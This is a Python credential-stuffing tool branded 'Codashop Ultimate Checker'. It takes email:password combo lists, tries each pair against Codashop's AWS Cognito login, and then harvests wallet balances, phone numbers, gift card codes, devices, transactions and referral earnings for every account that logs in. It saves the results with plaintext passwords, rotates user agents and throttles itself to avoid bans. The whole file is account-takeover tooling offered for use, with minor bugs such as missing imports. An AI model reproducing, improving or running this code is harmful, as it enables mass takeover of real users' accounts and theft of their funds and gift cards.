import sys
import time
import os
import random
import json
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.live import Live
from rich import box
from rich.prompt import Prompt
from colorama import init, Fore, Style
import requests

init(autoreset=True)
console = Console()

VERSION = "ULTIMATE v3.0"
CREATOR = "@rrielqt"
COGNITO_CLIENT_ID = "437f3u0sfh7h0av5rlrrjdtmsb"
COGNITO_REGION = "ap-southeast-1"
COGNITO_URL = f"https://cognito-idp.{COGNITO_REGION}.amazonaws.com/"
WALLET_API = "https://wallet-api.codacash.com"
USER_API = "https://user-api.codacash.com"
GAME_API = "https://game-api.codacash.com"
REFERRAL_API = "https://referral-api.codacash.com"

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

stats_lock = threading.Lock()
total_checked = 0
total_valid = 0
total_hits = 0
total_banned = 0
total_errors = 0
start_time = time.time()
total_accounts = 0
shutdown_event = threading.Event()

def format_date(iso_str):
    if not iso_str or iso_str == "N/A":
        return "N/A"
    try:
        dt = datetime.strptime(iso_str, "%Y-%m-%dT%H:%M:%S.%fZ")
    except:
        try:
            dt = datetime.strptime(iso_str, "%Y-%m-%dT%H:%M:%SZ")
        except:
            return iso_str
    return dt.strftime("%Y-%m-%d %H:%M:%S")

def country_code_to_name(code):
    mapping = {
        "608": "Philippines (PH)", "360": "Indonesia (ID)", "702": "Singapore (SG)",
        "458": "Malaysia (MY)", "764": "Thailand (TH)", "704": "Vietnam (VN)",
        "116": "Cambodia (KH)", "418": "Laos (LA)", "104": "Myanmar (MM)",
        "096": "Brunei (BN)", "410": "South Korea (KR)", "792": "Turkey (TR)",
        "826": "United Kingdom (GB)", "986": "Brazil (BR)"
    }
    return mapping.get(str(code), str(code))

def get_random_ua():
    return random.choice(USER_AGENTS)

def compute_aws_signature(secret, message):
    return base64.b64encode(hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()).decode()

class CodashopUltimate:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Origin": "https://www.codashop.com",
            "Referer": "https://www.codashop.com/",
            "x-country-code": "608"
        })
        self.results_dir = "Results"
        self.create_dirs()

    def create_dirs(self):
        dirs = [
            "Results/Hits", "Results/Fails", "Results/Banned",
            "Results/Errors", "Results/Transactions", "Results/Devices",
            "Results/Giftcards", "Results/Referrals", "Results/Sorted"
        ]
        for d in dirs:
            os.makedirs(d, exist_ok=True)

    def save_result(self, folder, filename, content):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = f"{folder}/{filename}_{ts}.txt"
        with open(path, "a", encoding="utf-8") as f:
            f.write(content + "\n")

    def cognito_auth(self, email, password):
        self.session.headers.update({"User-Agent": get_random_ua()})
        payload = {
            "AuthFlow": "USER_PASSWORD_AUTH",
            "ClientId": COGNITO_CLIENT_ID,
            "AuthParameters": {"USERNAME": email, "PASSWORD": password},
            "ClientMetadata": {"country_code": "ph", "country_name": "Philippines", "lang_code": "en"}
        }
        headers = {"X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth", "Content-Type": "application/x-amz-json-1.1"}
        resp = self.session.post(COGNITO_URL, json=payload, headers=headers, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if "AuthenticationResult" in data:
                return data["AuthenticationResult"]["IdToken"]
        elif resp.status_code == 400:
            err = resp.json().get("__type", "")
            if "NotAuthorizedException" in err or "UserNotFoundException" in err:
                return "invalid"
            elif "ForbiddenException" in err:
                return "banned"
        return None

    def api_get(self, url, token):
        self.session.headers.update({"Authorization": token, "User-Agent": get_random_ua()})
        resp = self.session.get(url, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("data")
        return None

    def get_wallet(self, token):
        data = self.api_get(f"{WALLET_API}/user/wallet", token)
        if data and data.get("resultCode") == 0:
            return data.get("data")
        return None

    def get_profile(self, token):
        return self.api_get(f"{USER_API}/user/profile", token)

    def get_transactions(self, token, limit=30):
        data = self.api_get(f"{WALLET_API}/user/transactions?limit={limit}&offset=0", token)
        if data and data.get("resultCode") == 0:
            return data.get("data", {}).get("transactions", [])
        return []

    def get_devices(self, token):
        data = self.api_get(f"{USER_API}/user/devices", token)
        return data if isinstance(data, list) else []

    def get_giftcards(self, token):
        data = self.api_get(f"{WALLET_API}/user/giftcards", token)
        if data and data.get("resultCode") == 0:
            return data.get("data", {}).get("giftCards", [])
        return []

    def get_referral(self, token):
        return self.api_get(f"{REFERRAL_API}/user/referral", token)

    def get_loyalty(self, token):
        data = self.api_get(f"{WALLET_API}/user/loyalty", token)
        if data and data.get("resultCode") == 0:
            return data.get("data", {}).get("points", 0)
        return 0

    def check(self, combo):
        global total_checked, total_valid, total_hits, total_banned, total_errors
        try:
            email, pwd = combo.split(":", 1)
            token = self.cognito_auth(email, pwd)
            if token == "invalid":
                with stats_lock:
                    total_checked += 1
                    total_invalid += 1
                self.save_result("Results/Fails", "fails", f"{email}:{pwd}")
                console.print(f"[red][-] FAIL: {email}:{pwd}[/red]")
                return
            if token == "banned":
                with stats_lock:
                    total_checked += 1
                    total_banned += 1
                self.save_result("Results/Banned", "banned", f"{email}:{pwd}")
                console.print(f"[yellow][!] BANNED: {email}:{pwd} - cooling 90s[/yellow]")
                time.sleep(random.uniform(80, 100))
                return
            if not token:
                with stats_lock:
                    total_checked += 1
                    total_errors += 1
                self.save_result("Results/Errors", "errors", f"{email}:{pwd} | Auth failed")
                console.print(f"[red][?] AUTH ERR: {email}:{pwd}[/red]")
                return

            wallet = self.get_wallet(token)
            profile = self.get_profile(token)
            transactions = self.get_transactions(token, 20)
            devices = self.get_devices(token)
            giftcards = self.get_giftcards(token)
            referral = self.get_referral(token)
            points = self.get_loyalty(token)

            if not wallet:
                with stats_lock:
                    total_checked += 1
                    total_errors += 1
                self.save_result("Results/Errors", "errors", f"{email}:{pwd} | No wallet")
                console.print(f"[red][?] NO WALLET: {email}:{pwd}[/red]")
                return

            balance = float(wallet.get("balanceAmount", 0))
            currency = wallet.get("currencyCode", "608")
            mobile = wallet.get("mobile", "N/A")
            created = format_date(wallet.get("createdOn", "N/A"))
            last_upd = format_date(wallet.get("lastUpdatedOn", "N/A"))
            total_spent = wallet.get("totalSpent", 0)

            profile_name = profile.get("name", "N/A") if profile else "N/A"
            profile_avatar = profile.get("avatar", "N/A") if profile else "N/A"

            ref_code = referral.get("code", "N/A") if referral else "N/A"
            ref_earned = referral.get("totalEarned", 0) if referral else 0

            hit_data = {
                "email": email, "password": pwd, "balance": balance,
                "currency": country_code_to_name(currency), "mobile": mobile,
                "created": created, "last_updated": last_upd,
                "total_spent": total_spent, "profile_name": profile_name,
                "avatar": profile_avatar, "points": points,
                "devices": len(devices), "giftcards": len(giftcards),
                "transactions": len(transactions), "referral_code": ref_code,
                "referral_earned": ref_earned
            }

            with stats_lock:
                total_checked += 1
                total_valid += 1
                total_hits += 1

            self.save_result("Results/Hits", "hits", f"{email}:{pwd} | Balance: {balance:.2f} | Points: {points} | Devices: {len(devices)}")
            self.save_transactions(token, email, pwd, transactions)
            self.save_devices(token, email, pwd, devices)
            self.save_giftcards(token, email, pwd, giftcards)
            self.save_referral(token, email, pwd, referral)

            console.print(format_hit(hit_data))
            console.print("=" * 80)
            time.sleep(random.uniform(1.5, 3.0))

        except Exception as e:
            with stats_lock:
                total_errors += 1
            self.save_result("Results/Errors", "errors", f"{combo} | {str(e)}")
            console.print(f"[red][!] EXCEPTION: {combo} | {str(e)}[/red]")

    def save_transactions(self, token, email, pwd, txns):
        if not txns:
            return
        content = f"{email}:{pwd}\n"
        for t in txns[:10]:
            amt = t.get("amount", 0)
            typ = t.get("type", "N/A")
            date = format_date(t.get("date", "N/A"))
            content += f"  └─ {amt} | {typ} | {date}\n"
        self.save_result("Results/Transactions", "transactions", content)

    def save_devices(self, token, email, pwd, devs):
        if not devs:
            return
        content = f"{email}:{pwd}\n"
        for d in devs:
            model = d.get("model", "N/A")
            last_active = format_date(d.get("lastActive", "N/A"))
            content += f"  └─ {model} | Last: {last_active}\n"
        self.save_result("Results/Devices", "devices", content)

    def save_giftcards(self, token, email, pwd, cards):
        if not cards:
            return
        content = f"{email}:{pwd}\n"
        for c in cards:
            code = c.get("code", "N/A")
            bal = c.get("balance", 0)
            content += f"  └─ {code} | Balance: {bal}\n"
        self.save_result("Results/Giftcards", "giftcards", content)

    def save_referral(self, token, email, pwd, ref):
        if not ref:
            return
        content = f"{email}:{pwd} | Code: {ref.get('code')} | Earned: {ref.get('totalEarned', 0)} | Clicks: {ref.get('clicks', 0)}"
        self.save_result("Results/Referrals", "referrals", content)

def format_hit(data):
    lines = []
    lines.append("╔══ Codashop Account Details")
    lines.append(f"║   ╠══ Email: {data['email']}")
    lines.append(f"║   ╠══ Password: {data['password']}")
    lines.append(f"║   ╠══ Balance: {data['balance']:.2f} {data['currency']}")
    lines.append(f"║   ╠══ Mobile: {data['mobile']}")
    lines.append(f"║   ╠══ Total Spent: {data['total_spent']}")
    lines.append(f"║   ╠══ Created: {data['created']}")
    lines.append(f"║   ╠══ Last Updated: {data['last_updated']}")
    lines.append(f"║   ╠══ Profile Name: {data['profile_name']}")
    lines.append(f"║   ╠══ Avatar: {data['avatar'][:50] if data['avatar'] != 'N/A' else 'N/A'}...")
    lines.append(f"║   ╠══ Loyalty Points: {data['points']}")
    lines.append(f"║   ╠══ Devices Count: {data['devices']}")
    lines.append(f"║   ╠══ Gift Cards Count: {data['giftcards']}")
    lines.append(f"║   ╠══ Transactions Count: {data['transactions']}")
    lines.append(f"║   ╠══ Referral Code: {data['referral_code']}")
    lines.append(f"║   ╠══ Referral Earnings: {data['referral_earned']}")
    lines.append(f"║   ╚══ Checked by {CREATOR}")
    return "\n".join(lines)

def select_input_file():
    combo_dir = "Combo"
    if not os.path.exists(combo_dir):
        os.makedirs(combo_dir)
        console.print("[yellow]Created 'Combo' folder. Place combo file there.[/yellow]")
        return None
    files = [f for f in os.listdir(combo_dir) if f.endswith(".txt")]
    if not files:
        console.print("[red]No .txt files in Combo folder[/red]")
        return None
    console.print("[bold cyan]Select combo file:[/bold cyan]")
    for i, f in enumerate(files, 1):
        console.print(f"  {i}. {f}")
    choice = Prompt.ask("[bold yellow]Enter number[/bold yellow]", choices=[str(i) for i in range(1, len(files)+1)])
    return os.path.join(combo_dir, files[int(choice)-1])

def build_live_stats():
    global total_accounts
    elapsed = time.time() - start_time
    progress = (total_checked / total_accounts * 100) if total_accounts > 0 else 0
    bar_len = 30
    filled = int(bar_len * progress / 100)
    bar = "█" * filled + "░" * (bar_len - filled)
    content = (
        f" {bar} {progress:.1f}%\n"
        f" Checked: {total_checked}/{total_accounts}\n"
        f" Hits: {total_hits} | Invalid: {total_invalid}\n"
        f" Banned: {total_banned} | Errors: {total_errors}\n"
        f" Time: {elapsed:.1f}s"
    )
    return Panel(content, title="[bold cyan]Codashop Ultimate Checker - Live Stats[/bold cyan]", border_style="bright_blue", box=box.ROUNDED)

def display_banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = r"""
 ██████╗ ██████╗ ██████╗  █████╗ ███████╗██╗  ██╗ ██████╗ ██████╗ 
██╔════╝██╔═══██╗██╔══██╗██╔══██╗██╔════╝██║  ██║██╔═══██╗██╔══██╗
██║     ██║   ██║██║  ██║███████║███████╗███████║██║   ██║██████╔╝
██║     ██║   ██║██║  ██║██╔══██║╚════██║██╔══██║██║   ██║██╔═══╝ 
╚██████╗╚██████╔╝██████╔╝██║  ██║███████║██║  ██║╚██████╔╝██║     
 ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     
"""
    console.print(f"[bright_cyan]{banner}[/bright_cyan]")
    console.print(Panel(f"[bold green]ULTIMATE CODASHOP CHECKER - {VERSION}[/bold green]\n[cyan]TG: {CREATOR}[/cyan]", border_style="bright_green", box=box.DOUBLE_EDGE))

def main():
    global total_accounts, total_invalid
    try:
        display_banner()
        file_path = select_input_file()
        if not file_path:
            return
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            combos = [line.strip() for line in f if line.strip() and ":" in line]
        total_accounts = len(combos)
        total_invalid = 0
        console.print(f"[cyan]Loaded {total_accounts} accounts[/cyan]")
        threads = int(Prompt.ask("[bold yellow]Threads (1-30)[/bold yellow]", default="10"))
        threads = min(30, max(1, threads))
        checker = CodashopUltimate()
        with Progress() as progress:
            task = progress.add_task("[cyan]Checking accounts...", total=total_accounts)
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(checker.check, combo) for combo in combos]
                for future in futures:
                    future.result()
                    progress.update(task, advance=1)
        console.print(build_live_stats())
        console.print("[green]All results saved to Results/ folder[/green]")
        input("[yellow]Press Enter to exit...[/yellow]")
    except KeyboardInterrupt:
        console.print("\n[red]Interrupted by user[/red]")
        sys.exit(0)

if __name__ == "__main__":
    main()